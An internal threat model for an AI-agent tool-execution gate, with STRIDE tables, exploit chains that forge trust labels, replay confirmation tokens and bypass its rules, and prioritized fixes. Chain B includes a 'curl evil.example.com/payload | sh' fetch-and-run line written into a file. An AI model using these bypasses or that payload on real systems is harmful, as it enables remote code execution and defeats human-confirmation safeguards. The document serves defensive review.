# Champion Gate Threat Model

**Date:** 2026-05-06
**Author:** BlackMage / Architect under Marshal scrutiny finding **BM2**
**Owners (handoff):** Architect (engineering response), BlackMage (offensive validation), MoatGhost (compliance mapping)
**Component scoped:** `pkg/champion/` and the public surface that exposes it through `cmd/zhen-agentd` (`/api/v1/tool/exec`, `/api/v1/agent/ask`, `/api/v1/agent/confirm`) and the new `cmd/zhen-cli` Phase 2 client. Forward-applicable to any future PEP that reuses `champion.Dispatch`.
**Status:** *initial draft* — companion to `k8s-threat-model-2026-05-06.md` and a direct response to scrutiny finding BM2 in `docs/compliance/control-matrix/01-scrutiny-2026-05-06.md` (lines 226-235).

---

## 1. Scope and assumptions

In scope:
- **The Champion gate itself**: `pkg/champion/champion.go`, `toolcall.go`, `dispatch.go`, `confirm.go`, `write.go`, `modelswap.go`. The three rules (path-allowlist, untrusted-justification, destructive-verb), the pending-confirmation token store, the action audit log, the path sandbox, and the model-swap subsystem.
- **The agent-facing HTTP entry points** in `cmd/zhen-agentd`: `/api/v1/agent/ask`, `/api/v1/agent/ask/stream`, `/api/v1/agent/confirm`, `/api/v1/tool/exec`. These are the only paths that reach `champion.Dispatch`.
- **Direct-CLI entry points** (`cmd/zhen-cli`) that Phase 2 routes through `/api/v1/tool/exec` with `EmittedBy: "zhen-cli"`.
- **The audit trail** Champion writes to `zhen_actions` (The Well, PostgreSQL) via `ActionStore`.
- **The justification chain** (`[]champion.Reference`) and its trust labels (`canonical`, `local`, `external`, `direct-user`).

Out of scope:
- The LLM itself (model-side prompt injection is covered by the separate Zhen AI threat model F3, BM3 in scrutiny).
- vor / cs (the retrieval substrate that produces `Reference` records — covered by F2 / Sealed Cask trust-chain doc).
- The macOS operator workstation (covered by F4).
- The PostgreSQL substrate Champion writes to — assumed honest. Compromise of The Well is its own attack tree, not Champion's.
- Wotan topic signing (handled by `services/wotan/internal/signing/` and ML-DSA-65, separate scope).

Assumptions:
- The daemon (`zhen-agentd`) runs as a **non-root user** on the operator's host. Verified by `pkg/champion/modelswap.go:147-150` which hard-fails if EUID==0.
- The daemon is reachable on `127.0.0.1:20105` only (verified by `cmd/zhen-agentd/main.go` `host` flag default; *unverified* whether deployments override this — see UNVERIFIED list below).
- An auth middleware exists (`pkg/auth/`) and is wired by `auth.SetupMiddleware(authCfg)` at `cmd/zhen-agentd/main.go:160`. **Auth is OFF by default** — controlled by `AUTH_ENABLED=true`; the daemon prints `auth middleware DISABLED` otherwise (`main.go:172`).
- A request rate limiter exists but is *opt-in* via `-rate-limit` flag (default 0 → disabled, `cmd/zhen-agentd/main.go:72`).
- The agent layer (`cmd/zhen-rag`, web UI) is the *intended* producer of `[]champion.Reference` chains; programmatic callers also produce them. **Champion does not verify these chains against vor — see Threat T2 below.**
- Champion's audit row is written *best-effort*: `logAction` and `completeAction` swallow errors (`champion.go:207-228`). Compromise of The Well does not directly compromise Champion's gate decisions, but it does erase the forensic trail.

---

## 2. Trust zones

| Zone | Tenant | Crosses what boundary | Trusted by Champion? |
|------|--------|-----------------------|----------------------|
| Z0: The operator (human) | Stevie at the keyboard | host kernel | yes — Champion has no concept of human identity except via `direct-user` trust label, which is *asserted by the caller, not verified* |
| Z1: zhen-cli (Phase 2 binary) | `cmd/zhen-cli/main.go` | local TCP → `127.0.0.1:20105` | inherits whatever auth the daemon enforces; **emits `EmittedBy: "zhen-cli"`** with NO justification, daemon **defaults to `direct-user`** (`cmd/zhen-agentd/toolexec.go:127-136`) |
| Z2: raft/zhen_app.py web UI | Flask app on `127.0.0.1:20103` | local TCP → daemon | identical posture to Z1 — **also defaults to `direct-user`** when justification omitted |
| Z3: zhen-agentd HTTP layer | `cmd/zhen-agentd` Go binary | invokes Champion in-process | trusted: this is where `champion.Dispatch` is called |
| Z4: Champion (`pkg/champion`) | the gate itself | reads PostgreSQL, runs subprocesses (runbook + model swap) | this is the trust boundary being modeled |
| Z5: subprocess (runbook + model-swap) | `python3 scripts/run-runbook.py`, `scripts/switch-model.sh` | host kernel, filesystem under `runbooks/` and `scripts/` | inherits Champion's UID; subprocess output capped at 64 KiB / 8 KiB |
| Z6: vor (retrieval) | `cs/vor` server | local TCP → vor `:9876` | NOT a Champion peer — Champion never calls vor; references are passed in by the caller |

Trust flows: **Z0 → Z1/Z2 → Z3 → Z4 → Z5**. The crucial design assumption is that **Z3 has authenticated and rate-limited the request** before Champion sees it. **The matrices' MAPPED entries for AC-3, AC-6, CC6.1, CC6.6 implicitly depend on this.** When auth is OFF (default), the entire trust chain collapses onto a single TCP listener.

---

## 3. STRIDE-by-component

### 3.1 `champion.AcceptToolCall` (the three-rule gate)

| Threat | Severity | Notes / evidence |
|--------|----------|------------------|
| **S** — Spoofing of `EmittedBy` / `Justification` | **High** | `EmittedBy` is a free-form string set by the caller (`toolcall.go:42`). Justification is `[]Reference`, also caller-supplied (`toolcall.go:37`). **Champion does not verify either.** A compromised `cmd/zhen-cli` session can claim `EmittedBy: "human-operator"` or any other label — no signature, no MAC, no bound session. Spoofing is structurally trivial. |
| **T** — Tampering with the rule order | Low | Rule precedence is encoded at `toolcall.go:234-282` (Rule 3 → Rule 2 → Rule 1). Tampering requires modifying `pkg/champion` source — out of scope. |
| **R** — Repudiation of a tool call | Medium | Audit row written via `c.logAction` / `c.completeAction`. **Errors from the audit store are swallowed** (`champion.go:207-228` returns 0, no caller checks). If The Well is unreachable, the call still proceeds and *no row is written*. A determined attacker who can disrupt PostgreSQL (e.g. by exhausting connections) gets free, unaudited tool execution. |
| **I** — Info disclosure via error messages | Low | Error messages include path strings and ref labels (`toolcall.go:250-253`), not secrets. `summarizeArgs` truncates strings at 200 chars (`toolcall.go:309-320`). Acceptable. |
| **D** — DoS via gate flooding | Medium | `AcceptToolCall` runs synchronously, holds no global mutex (except inside `ModelSwap`). Flooding `/api/v1/tool/exec` with read calls produces audit-log thrash; flooding with mutating calls produces pending-token churn (`confirm.go:39` ungc'd map until `gc()` is opportunistically called). Rate limit is **opt-in** (`cmd/zhen-agentd/main.go:72`). |
| **E** — Privilege escalation via Rule 2 escape hatch | **High** | The `direct-user` SourceTrust label (`toolcall.go:148-158`) is the documented escape from "untrusted justification." `HasUntrustedJustification()` ONLY checks for `external` (line 167), so `direct-user` passes by virtue of *not being external*. **Any caller who can write JSON can assert `direct-user` and bypass Rule 2 on every mutation.** This is the BM2 finding #1 confirmed at the source. |

#### 3.1.1 Rule 2 escape mechanics (BM2 #1)

The "trust label" is structurally a string the caller chose. The exploit path is in three lines:

1. `cmd/zhen-cli/main.go:413-417`: zhen-cli posts `toolExecRequest` with `EmittedBy: "zhen-cli"` and **no `Justification`** field set.
2. `cmd/zhen-agentd/toolexec.go:127-136`: when justification is empty, the daemon synthesizes one with `SourceTrust: "direct-user"` and submits.
3. `pkg/champion/toolcall.go:159-171`: `HasUntrustedJustification` sees a non-empty chain whose only ref is `direct-user`, returns false — Rule 2 passes.

A compromised CLI session needs no creativity: it just needs to exec the binary. Anyone with shell access on the operator's host (or anyone who can reach the daemon's port if auth is off) can therefore mutate the kingdom.

The `cmd/zhen-cli` README and Phase 2 launch notes describe this as "T6b closure: every mutation slash command in this CLI hits cmd/zhen-agentd /api/v1/tool/exec, which dispatches through pkg/champion.Dispatch — Champion's three-rule gate is in the path automatically." The gate is in the path; it is also functionally a no-op for any Z1/Z2 caller because of the default-justification injection.

### 3.2 `champion.HasUntrustedJustification` and `Reference` fidelity

| Threat | Severity | Notes / evidence |
|--------|----------|------------------|
| **S** — Justification chain forgery (BM2 #2) | **High** | `Reference` (`toolcall.go:48-56`) carries `Topic`, `Category`, `SourceKind`, `SourceTrust`, `SourcePath`, `SourceLabel`, `Excerpt`. **Champion never calls vor.** Grep confirms: zero references to vor or any topic-existence check inside `pkg/champion/`. A caller can fabricate a chain like `{Topic: "kingdom-runbook-host-bootstrap", SourceTrust: "canonical"}` — Champion accepts it as canonical. The `canonical` label is then sufficient to pass Rule 2 (it is not `external` and it is not empty). The defense documented in the matrices ("Rule 2 evaluates retrieval-derived chain") only holds if the caller is honest. |
| **T** — Tampering with vor before retrieval | n/a here | Out of scope — covered by Sealed Cask threat model. |
| **R** — Repudiation of which ref justified a call | Low | The chain is logged into `summarizeArgs(tc.Args)` only if it's an arg, not separately (`toolcall.go:309-320`). The chain itself is NOT directly logged into the audit row — the action only records the arg map. UNVERIFIED whether the chain is reconstructable from logs after the fact (see UNVERIFIED §8, item U4 / U8). |
| **I** — Info disclosure via excerpt field | Low | `Excerpt` is intended as a 200-char snippet for audit; no secret-handling logic verifies it. If an attacker stuffs PII into `Excerpt`, it ends up in audit logs. PII-exposure surface is small but real. |
| **E** — Trust-label privilege ladder | **High** | `canonical` and `local` and `direct-user` all silently bypass Rule 2 because the function only checks `external`. The four documented labels are not a hierarchy — they are a sieve with one `external` hole. A misconfigured agent layer that emits `canonical` for *anything user-supplied* compromises the gate for the lifetime of that agent. |

### 3.3 `champion.confirmStore` (pending-confirmation tokens, BM2 #3)

| Threat | Severity | Notes / evidence |
|--------|----------|------------------|
| **S** — Token forgery | Low | Tokens are 16 bytes from `crypto/rand` → 32 hex chars (`confirm.go:99-108`). Brute-force infeasible. |
| **T** — Tampering with bound ToolCall | Low | `pendingEntry.Call` is held in-memory by value (`confirm.go:24-29`); no mutation path. |
| **R** — Repudiation of confirmation | Medium | `ConfirmPendingToolCall` logs `tool_call_user_confirmed` with `triggeredBy: "user"` (`confirm.go:171-173`). The token does NOT bind a user identity — only a `ToolCall` struct. **Anyone with the token can redeem it**, not just the original requester. |
| **I** — Token leakage | Medium | The token is returned in the HTTP response body to whoever made the request (`cmd/zhen-agentd/toolexec.go:188`, `main.go:482-484`). If the agent layer logs the response (e.g., Flask app debug logs, browser fetch logs), the token is in those logs for `PendingConfirmTTL = 5 * time.Minute` (`confirm.go:21`). |
| **D** — Token-store memory exhaustion | Medium | `confirmStore.entries` is a `map[string]*pendingEntry` with no upper bound. `gc()` is called only inside `IssuePendingConfirmation` (`confirm.go:127`) — no periodic sweeper. A loop of POSTs that issue but never redeem can OOM the daemon. Only `gc()`-on-issue keeps it bounded; a single attacker thread can outpace `gc()` since `gc()` removes only used or expired entries — fresh entries pile up linearly. |
| **E** — Replay across requesters (BM2 #3) | **High** | **The token is bound to the `ToolCall`, not to the requester.** No session ID, no IP, no user identity is recorded in `pendingEntry`. Concretely: web UI (Z2) makes a request, gets a token; if zhen-cli (Z1) intercepts the response (e.g., via a shared log file, browser-cookie leak, or a poisoned `mitmproxy` env var), the CLI can redeem the token and execute the tool. The requester binding is missing. The 5-minute TTL is the only mitigation. |

### 3.4 `champion.Dispatch` and the tool allowlist (BM2 #4)

| Threat | Severity | Notes / evidence |
|--------|----------|------------------|
| **S** — Spoofing tool name | Low | The Dispatch switch (`dispatch.go:38-141`) is exhaustive — unknown tools fall through to `default: unimplemented` (line 139). Cannot smuggle an unregistered tool through Dispatch. |
| **T** — Allowlist drift | Medium | `MutatingTools` and `ReadOnlyTools` (`toolcall.go:63-85`) are hard-coded. **Mismatch found**: `runbook_show` and `runbook_list` are in `ReadOnlyTools` (lines 81-82) but **have no case in `Dispatch`'s switch** (`dispatch.go:38-141`). Calls to these tools fall through to `default: unimplemented tool`. The CLI relies on these (`cmd/zhen-cli/main.go:308, 322`); they will silently fail in production. *Not a security threat directly, but it is a correctness gap that obscures whether the gate would even fire.* See Recommendation 9. |
| **R** — Action without audit | Low | Every Dispatch case routes to a `Champion.<Tool>` method that calls `logAction` / `completeAction`. The action row is the audit. |
| **I** — Tool enumeration via timing | Low | Unknown tool names produce a fast `unimplemented` error before any side effects; known unimplemented tools (above) error similarly. Timing side-channel is not exploitable for trust-label leakage. |
| **D** — Tool flood | Medium | Same as 3.1 — no per-tool rate limit. `runbook_execute` has a 10-min subprocess cap (`write.go:316`); `model_switch` has a 6-min cap (`modelswap.go:221`). Concurrent runbook execs are possible (no single-flight); concurrent model swaps are blocked (`modelswap.go:175-180`). |
| **E** — Pivot via most-permissive tool (BM2 #4) | **High** | The mutating allowlist is finite: `write_file`, `patch_file`, `delete_file`, `kanban_create/update/delete`, `runbook_execute`, `system_command`, `model_switch`. Of these, the **most permissive** is **`runbook_execute`** — it runs *any* YAML under `runbooks/` as the daemon's UID via Python subprocess. `runbooks/` includes `infra/`, `network/`, `security/`, `data/`, `observe/`, `doom/`, `deploy/` (per CLAUDE.md). Once Rule 2 is bypassed (3.1.1), `runbook_execute` is a generic remote-code-execution primitive. **`system_command` is even worse** if it exists, but UNVERIFIED — see §8, item U6. |

#### 3.4.1 `system_command` — UNVERIFIED

`MutatingTools` (`toolcall.go:71`) lists `"system_command": true`, but **there is no case in `Dispatch`'s switch for it** (`dispatch.go:38-141`). Same gap shape as `runbook_show`/`runbook_list` (3.4 row T). Currently a paper tool. **Recommendation**: either remove from `MutatingTools` or implement with hard guardrails (no shell, no `exec.Command`, fixed allowlist of subcommands). Treat as latent surface until removed.

### 3.5 `champion.WriteFile` / `PatchFile` and `validatePath`

| Threat | Severity | Notes / evidence |
|--------|----------|------------------|
| **S** — Path-spoofing via symlink | Medium | `validatePath` (`champion.go:176-204`) runs `filepath.Abs` and rejects `..`, but **does not call `filepath.EvalSymlinks`**. A symlink in `ProjectRoot` pointing outside (e.g., `<root>/etc-shadow → /etc/shadow`) could be traversed because the abs-path check fires before symlink resolution. The denied-path check uses `strings.Contains` (line 190), so `/etc/shadow` is caught — but a denied substring outside the explicit list is not. **TOCTOU**: even if the gate read symlinks correctly, the write is `os.WriteFile` afterward with the same string — between gate and write, a symlink could be swapped. UNVERIFIED whether real-world deployment runs `chattr +i` on `runbooks/` and `scripts/`. |
| **T** — Tampering with `DeniedPaths` | Low | Denied list is hard-coded at `champion.go:104-115`; tampering requires source-mod. |
| **R** — Snapshot-store omission | Medium | If `c.snapshotStore` is nil (the default — only set if `WithSnapshotStore` is called), writes happen with **no before-state snapshot** (`write.go:60-63`). A revert is impossible. The matrices imply revert is a control; verify it's actually wired in production. UNVERIFIED. |
| **I** — Snapshot exfil | Low | Snapshots are stored in-DB; exposure path is the snapshot store, not Champion. |
| **D** — Disk-fill via large writes | Medium | No per-write byte cap. `WriteFile(ctx, path, content)` happily writes a 10 GiB string if the args allow. The HTTP layer caps body at 64 KiB for `/tool/exec` (`toolexec.go:86`) — so this is mitigated *for the HTTP path*, but direct callers have no cap. |
| **E** — `MkdirAll` privilege | Low | Permissions hard-coded `0755` (dir) and `0644` (file) (`write.go:50, 55`). No setuid. |

### 3.6 `champion.RunbookExecute`

| Threat | Severity | Notes / evidence |
|--------|----------|------------------|
| **S** — Runbook name spoof | Low | Name is checked against `..` and absolute prefix, then `filepath.Rel`-checked against `runbooks/` (`write.go:281-299`). Reasonable defense in depth. |
| **T** — Runbook YAML tampering | **High** | The runbook YAML on disk is read by `scripts/run-runbook.py`. Champion does NOT verify the YAML's content, hash, or signature. Anyone with write access to `runbooks/` controls what runs. **Sealed Cask is the layer that should sign these**, but UNVERIFIED whether `runbooks/` is covered by Sealed Cask manifest verification. |
| **R** — Output truncation hiding bad behavior | Low | Output capped at 64 KiB (`write.go:325-330`). Truncation is logged. Acceptable. |
| **I** — Stdout containing secrets | Medium | Runbook stdout is captured into the audit row and into the HTTP response. If a runbook prints secrets, those land in audit and in Z2/Z1 logs. PII exposure is real. |
| **D** — Subprocess hangs | Low | Hard cap 10 min (`write.go:316`). No concurrency cap, however — N concurrent runbooks consume N subprocess slots. |
| **E** — Python interpreter injection | Medium | `python3` is invoked via `exec.CommandContext` (no shell — `write.go:319`). Argv is `[run-runbook.py, --dry-run?, runbookPath]`. No shell metachar interpretation. The risk is purely whatever `run-runbook.py` itself does with the YAML — and that file is not in this scope. |

### 3.7 `champion.ModelSwap`

| Threat | Severity | Notes / evidence |
|--------|----------|------------------|
| **S** — Spoofing via key | Low | Two-layer allowlist: regex `^[a-z0-9][a-z0-9-]{0,31}$` (`modelswap.go:62`) and parse-from-script (`parseModelKeys`, `modelswap.go:69-96`). Solid. |
| **T** — TOCTOU on switch-model.sh | Low | Script SHA-256 captured on first call and re-checked every subsequent call (`modelswap.go:184-208`). `ErrScriptModified` on mismatch. |
| **R** — Concurrent-swap audit confusion | Low | Single-flight lock + `ErrSwapInProgress` (`modelswap.go:175-180`). Audit rows are independent. |
| **I** — Output leak | Low | Last 8 KiB only (`modelswap.go:231-235`). Reasonable. |
| **D** — Swap-spam DoS | Low | Single-flight lock prevents concurrent swap. Repeated serial swaps are still possible but each takes 30 s – 142 s wall-time (per the comment block); rate-limited by physics. |
| **E** — Run as root | Low | Hard-fail at EUID==0 (`modelswap.go:147-150`). |

ModelSwap is the most-defended subsystem in `pkg/champion`. The other tools should aim for this posture.

### 3.8 The HTTP edge (`/api/v1/tool/exec`, `/api/v1/agent/confirm`)

| Threat | Severity | Notes / evidence |
|--------|----------|------------------|
| **S** — Caller spoofs `EmittedBy` | High | Direct passthrough into `champion.ToolCall.EmittedBy` (`toolexec.go:155`). No sanity check, no auth-binding. Audit row records whatever the caller said. |
| **T** — Body tamper | Low | `io.LimitReader(r.Body, 1<<16)` (`toolexec.go:86`) caps at 64 KiB; JSON decoder rejects malformed bodies with 400. |
| **R** — Repudiation when auth is off | High | With `AUTH_ENABLED=false` (the default per `main.go:172`), there is no caller identity at all — the audit row's `triggered_by` is `"user"` because `logAction` hardcodes that string for tool calls (`toolcall.go:232`, `confirm.go:171-173`). All actions look identical regardless of which Z1/Z2 client made them. |
| **I** — Pending token in HTTP response | Medium | The 32-hex token returned in `pending_token` (`toolexec.go:188`) is not flagged secret; ordinary access logs at HAProxy / Nginx will capture response bodies if `option httplog` or equivalent is on. UNVERIFIED at the edge. |
| **D** — POST body amplification | Low | 64 KiB cap on `/tool/exec`, 16 KiB on `/agent/confirm` (`main.go:717`). Adequate. |
| **E** — `project_root` traversal | Low | `filepath.Abs` + allow-list map check (`toolexec.go:112-121`, `main.go:738-748`). Map is built at startup. Solid as long as `-allowed-roots` flag isn't misused. |

The HTTP edge inherits every gap from §3.1–3.4 and adds two of its own (S row, R row when auth is off).

---

## 4. Concrete chained-exploit walkthroughs

The findings above interact. Two concrete chains illustrate how a low-effort attacker compromises the kingdom.

### 4.1 Chain A — Compromised zhen-cli session → arbitrary RCE

**Pre-conditions:** Attacker has shell on the operator's host as the operator's UID (e.g., a phishing payload that landed via a poisoned npm package, a malicious VS Code extension, or a successful F4 macOS-workstation compromise). Daemon is running on `127.0.0.1:20105` with `AUTH_ENABLED=false` (the default — U2 unverified for production).

**Steps:**

1. Attacker enumerates `runbooks/` on disk (read-only, no privilege needed): `find runbooks -name '*.yaml' | head`. Picks `infra/host-bootstrap.yaml` (most permissive likely candidate).
2. Attacker crafts a single HTTP POST:
   ```
   POST /api/v1/tool/exec HTTP/1.1
   Host: 127.0.0.1:20105
   Content-Type: application/json

   {"tool":"runbook_execute","args":{"name":"infra/host-bootstrap","dry_run":false},"emitted_by":"zhen-cli"}
   ```
3. Daemon's `handleToolExec` (`toolexec.go:127-136`) sees empty `Justification`, synthesizes `[{SourceTrust: "direct-user"}]`.
4. `champion.AcceptToolCall` (`toolcall.go:229-283`):
   - Rule 3 (destructive verb): `args` contains no shell verbs → pass.
   - Rule 2: `IsMutating()` returns true (runbook_execute is in `MutatingTools`); `HasUntrustedJustification()` returns false (the lone ref's `SourceTrust == "direct-user"`, not `"external"`) → **pass**.
   - Rule 1: no `path` arg → skip.
5. Dispatch routes to `RunbookExecute("infra/host-bootstrap", false)`. Subprocess spawns. Operator UID. 10-min budget.
6. The audit row records `triggered_by="user"` and `emitted_by="zhen-cli"`. Forensics will show this as a legitimate user action.

**Time-to-exploit:** ~30 seconds, single curl, no creativity. **Detection:** zero — unless the operator notices the runbook ran without their click.

### 4.2 Chain B — Justification-chain forgery → write-file primitive

**Pre-conditions:** Same as Chain A, OR network access to the daemon if it's bound publicly (U1 unverified for production).

**Steps:**

1. Attacker constructs a forged justification chain claiming a known-canonical topic:
   ```json
   {"tool":"write_file","args":{"path":"/var/zhen/cron-bootstrap.sh","content":"#!/bin/sh\ncurl evil.example.com/payload | sh\n"},
    "justification":[{"topic":"runbooks-overview","category":"infra","source_kind":"embedded","source_trust":"canonical","source_label":"runbooks/README.md"}]}
   ```
2. Champion never calls vor; never confirms `runbooks-overview` exists with `source_trust: "canonical"`. The `Reference` is taken at face value (`toolcall.go:165-171`).
3. Rule 2 sees `canonical` (not `external`) → pass. Rule 1 (`path`) checks `/var/zhen/...` against `AllowedPaths` which by default includes `/var/zhen/` (`champion.go:98-102`) → pass. Rule 3 (destructive verb): the payload string `curl ... | sh` does NOT match any pattern in `destructivePattern` (`toolcall.go:94-111`) — pipe-to-shell is not in the list → pass.
4. Champion writes the file. Whatever cron / systemd timer the attacker arranged separately picks it up later.

**Time-to-exploit:** ~30 seconds. **Detection:** an audit row exists, but the chain claims it was a canonical-trust action.

### 4.3 Chain C — Token-replay across requesters

**Pre-conditions:** Two co-located Z1/Z2 callers (web UI + CLI), or one caller whose response logs are observable to the attacker.

**Steps:**

1. Web UI (Z2) submits a tool call that *does* hit Rule 2 (e.g., genuine external-trust ref). Daemon issues `pending_token`, returns 403 with the token in the response body (`toolexec.go:186-192`).
2. Browser DevTools / Flask debug log / reverse-proxy access log captures the token. Attacker reads it within 5 minutes (`PendingConfirmTTL`, `confirm.go:21`).
3. Attacker, from a separate process / IP, POSTs to `/api/v1/agent/confirm`:
   ```json
   {"token":"<stolen>","project_root":"/home/govan/tmp/unheaded"}
   ```
4. `confirmStore.consume` (`confirm.go:64-83`) validates token freshness; succeeds. There is **no requester-identity check**.
5. `ConfirmPendingToolCall` (`confirm.go:141-178`) runs the bound ToolCall through Rules 3 and 1 (Rule 2 is suppressed by design). Mutating tool executes.

**Time-to-exploit:** depends on log-leak surface; under 5 minutes once a token is observed. **Detection:** audit row records `tool_call_user_confirmed` with `triggered_by="user"` — indistinguishable from a legitimate confirmation.

These three chains share one root cause: **the gate trusts caller-supplied labels (`EmittedBy`, `SourceTrust`, pending-token bearer) as if they were identity claims with integrity, when they are merely strings with no binding to the authenticated principal.** Recommendations 1–3 in §6 are the structural fixes.

---

## 5. Threat-vector summary (highest-severity first)

The five highest-severity items in priority order:

1. **Rule-2 bypass via `direct-user` default** (BM2 #1, §3.1.1).
   The daemon defaults justification to `direct-user` when none is supplied (`cmd/zhen-agentd/toolexec.go:127-136`); the gate never checks who the caller actually is. **Compromised `cmd/zhen-cli` session = generic kingdom-mutation primitive.** The matrices' AC-3 / AC-6 / CC6.1 evidence claims rest on Rule 2 being meaningful; in practice, for any caller behind Z1/Z2, Rule 2 is opt-in.

2. **Justification-chain forgery: Champion does not verify references against vor** (BM2 #2, §3.2).
   `Reference` is structurally a caller-supplied JSON object. Champion never calls vor's `/api/topics` or `/api/search` to confirm the cited topic exists or that its `source_trust` field matches. A caller asserting `{SourceTrust: "canonical"}` passes Rule 2 unconditionally. The matrices imply chain validation is a control; the code shows it isn't.

3. **`runbook_execute` is a generic RCE primitive once Rule 2 is bypassed** (BM2 #4, §3.4.1).
   Of the mutating tools, `runbook_execute` runs any YAML under `runbooks/` as the daemon UID via Python subprocess. With (1) and (2) combined, it gives the attacker arbitrary remote code execution constrained only by what runbooks exist on disk. Sealed Cask coverage of `runbooks/` is UNVERIFIED.

4. **Pending-confirmation token has no requester binding** (BM2 #3, §3.3).
   The token (`confirmStore.entries`, `confirm.go:24-29`) binds a `ToolCall` but **not** a session, IP, or user. Any code path that gets the token bytes within 5 minutes can redeem it. If web-UI logs leak the token (browser DevTools, flask debug logs, reverse proxy access logs), zhen-cli can redeem it.

5. **Auth and rate-limit are off-by-default** (§1, §2).
   `AUTH_ENABLED=true` is required to enable auth (`cmd/zhen-agentd/main.go:160-174`); `-rate-limit` defaults to 0. Together these make every other mitigation in this document optional from the network side. A misconfigured deployment with auth=off and rate-limit=0 turns the daemon into a port-21080-equivalent management plane with no login.

Lower-severity but worth tracking:

6. `runbook_show` / `runbook_list` are listed in `ReadOnlyTools` but not implemented in `Dispatch` (§3.4 row T) — correctness gap, not a security gap, but obscures whether the gate fires for these tools.
7. `system_command` is in `MutatingTools` but not in `Dispatch` (§3.4.1) — latent attack surface.
8. `validatePath` does not resolve symlinks (§3.5) — potential sandbox-escape primitive on a host where symlinks exist inside `ProjectRoot`.
9. `confirmStore` has no periodic GC, only opportunistic (§3.3 D row) — slow memory leak / DoS.
10. Audit-store errors are swallowed (§3.1 R row) — repudiation gap if The Well is unreachable.

---

## 6. Recommendations (prioritized)

1. **Don't synthesize `direct-user` justification at the daemon layer.**
   Remove `cmd/zhen-agentd/toolexec.go:127-136`'s default-injection. Require the caller to supply a justification; if missing, reject with 400. If the web UI / CLI need to assert direct-user, **make them sign the assertion** — e.g. with a short-lived HMAC keyed on a per-session secret bound to the auth-middleware identity. **Owner:** Architect.

2. **Verify the justification chain against vor before accepting `canonical` / `local` trust labels.**
   Add a `chainVerifier` interface to Champion (`type ChainVerifier interface { Verify(ctx, []Reference) error }`); the production implementation calls vor's `/api/topics/<name>` for each ref and confirms the `source_trust` server-side rather than trusting the inbound field. Mark unverified refs as `external` and let Rule 2 fire. **Owner:** BlackMage + Architect.

3. **Bind pending-confirmation tokens to requester identity.**
   Extend `pendingEntry` (`confirm.go:24-29`) with `IssuedTo string` — the auth-middleware identity (or, if auth is off, the request IP). At redeem-time, require the redeemer to match the issuer. Phase 3 of zhen-cli already calls out a `/confirm <token>` flow — wire identity into that path. **Owner:** Architect.

4. **Make AUTH_ENABLED and rate-limit ON by default.**
   Flip `cmd/zhen-agentd/main.go:160-174` so the daemon refuses to start without auth configured (with an explicit `--no-auth` opt-out for local development that emits a startling banner). Default `-rate-limit` to 5 RPS. **Owner:** Architect.

5. **Add a periodic GC goroutine to `confirmStore`.**
   Currently `gc()` is only opportunistic (`confirm.go:127`). Spawn a `time.Ticker(1 * time.Minute)` goroutine in `New()` to call `s.gc()` so memory is bounded under a token-issue flood. **Owner:** Architect.

6. **Resolve symlinks in `validatePath`.**
   Replace `filepath.Abs` with `filepath.EvalSymlinks` followed by the prefix check (`champion.go:178-201`). Additionally, harden against TOCTOU by re-resolving the path **inside** `WriteFile` after the gate, immediately before `os.WriteFile`. **Owner:** Architect.

7. **Cap write size.**
   `WriteFile` should reject `len(content) > maxBytes` (suggest 8 MiB). HTTP layer already caps at 64 KiB for `/tool/exec`; direct callers have no cap. **Owner:** Architect.

8. **Sealed Cask should cover `runbooks/`.**
   Verify (and if absent, add) a SHA-256 manifest for every YAML in `runbooks/`. Champion's `RunbookExecute` should refuse to run a runbook whose content hash does not match the manifest. **Owner:** BlackMage + Sealed Cask owner.

9. **Implement or remove `runbook_show`, `runbook_list`, `system_command`.**
   The first two are needed by zhen-cli; ship the implementations. The third (`system_command`) should either be removed from `MutatingTools` (if unimplemented intentionally) or implemented with a hard subcommand allowlist (no shell, no `bash -c`, no env passthrough) and matching test coverage. **Owner:** Architect.

10. **Audit-store failures must be observable.**
    `logAction` / `completeAction` swallow errors (`champion.go:207-228`). Surface a Prometheus counter `champion_audit_failures_total{kind}`. Add an alert that fires within 60 s if any audit write fails. **Owner:** BlackMage + MoatGhost.

11. **Document the Champion threat model in the matrix family.**
    The fix for the BM2 finding itself — every matrix that cites Champion (AC-3, AC-6, CC6.1, CC6.6, CIS 6.7, CMMC 03.01.07, FedRAMP AC) should reference this doc and explicitly note the residual gap until items 1-3 ship. **Owner:** MoatGhost.

12. **Pen-test the trust-label sieve.**
    Construct a fuzz harness over `HasUntrustedJustification` that enumerates `SourceTrust` values: `canonical`, `local`, `external`, `direct-user`, `""`, `"CANONICAL"` (case mismatch), `"canonical\x00external"` (null-byte split), Unicode lookalikes. Confirm only the documented escape labels pass. **Owner:** BlackMage.

---

## 7. Residual-risk register and dollar-framed exposure (for F5 IR-plan reference)

The IR-plan (F5) needs a per-finding exposure annotation. These are *order-of-magnitude* estimates against a notional Unheaded production deployment (assumed: ~10 services, ~100 GiB working data, daemon UID has no sudo). Attack outcomes are derived from the chains in §4.

| ID | Finding (short) | If exploited, attacker can… | Order-of-magnitude $ exposure | Time-to-mitigate |
|----|-----------------|-----------------------------|-------------------------------|------------------|
| C-1 | Rule-2 bypass via direct-user default (§3.1, Chain A) | Run any runbook in `runbooks/`; arbitrary code as daemon UID | $50K–$500K (downtime + re-image cost; $5M+ if pivots to exfil customer data) | < 1 day (rec #1) |
| C-2 | Justification-chain forgery (§3.2, Chain B) | Write any file under `AllowedPaths` (default: ProjectRoot + /var/zhen/); persist payload | $25K–$250K (incident response, forensic review of all writes) | 1–5 days (rec #2) |
| C-3 | Pending-token replay (§3.3, Chain C) | Hijack a confirmed-mutation within 5 min of any genuine pending issuance | $10K–$100K per incident (one mutation, escalates if multiple) | 1–3 days (rec #3) |
| C-4 | Auth-off default (§3.8) | Any of the above with zero local-shell requirement | up to $10M+ (full exfil + lateral movement; depends on host network exposure U1) | < 1 day (rec #4) |
| C-5 | runbook_execute YAML tampering (§3.6) | Modify YAML on disk, then trigger via gate | depends on Sealed Cask coverage U5 | 3–10 days (rec #8) |
| C-6 | Symlink-based path escape (§3.5) | Read or write outside `AllowedPaths` if symlinks exist in tree | $10K–$50K (data exfil scoped to operator UID) | 2–5 days (rec #6) |
| C-7 | Audit-store DoS hides attack (§3.1 R) | Run undetected by knocking The Well over | small alone; force-multiplier on C-1/C-2 | 1–2 days (rec #10) |
| C-8 | confirmStore unbounded GC (§3.3 D) | OOM-kill the daemon | $1K–$10K (downtime, no data loss) | < 1 day (rec #5) |
| C-9 | Allowlist drift (`runbook_show`/`runbook_list`/`system_command` in maps but not Dispatch) (§3.4) | Latent surface; not directly exploitable today | $0 today, $50K+ if `system_command` ever ships without guardrails | 1–2 days (rec #9) |
